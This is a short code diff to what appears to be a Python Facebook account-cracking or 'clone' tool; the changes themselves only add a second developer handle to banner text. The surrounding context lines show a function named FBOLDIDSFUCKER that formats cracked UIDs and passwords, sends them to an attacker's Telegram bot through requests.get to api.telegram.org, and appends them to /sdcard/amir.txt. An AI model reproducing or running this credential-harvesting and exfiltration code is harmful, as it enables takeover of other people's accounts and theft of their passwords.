@@ -149,7 +149,7 @@ logo = f"""
 {R}DEVELOPER ● PS > @p7s7s
 {R}STATUS  ● Premium")
 {R}FUTURES  FILE // CLONE
-{R} DEV • PS ~ p7s7s
+{R} DEV • PS ~ p7s7s - @IIlI2I
 """
 
 #[===================CLEAR======================]#
@@ -255,7 +255,7 @@ def FBOLDIDSFUCKER(uid, pas, tl):
  UID : {uid}
  PASS : {ps}
 ━━━━━━━━━━━━━━━━━━
- Developer : @p7s7s
+ Developer : @p7s7s- @IIlI2I
 ↳
 ━━━━━━━━━━━━━━━━━━''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                     open("/sdcard/amir.txt", "a").write(uid + "|" + ps + "\n")
@@ -269,7 +269,7 @@ def FBOLDIDSFUCKER(uid, pas, tl):
  UID : {uid}
  PASS : {ps}
 ━━━━━━━━━━━━━━━━━━
- Developer : @p7s7s
+ Developer : @p7s7s- @IIlI2I
 Telegram Channels :
 ↳
 ━━━━━━━━━━━━━━━━━━
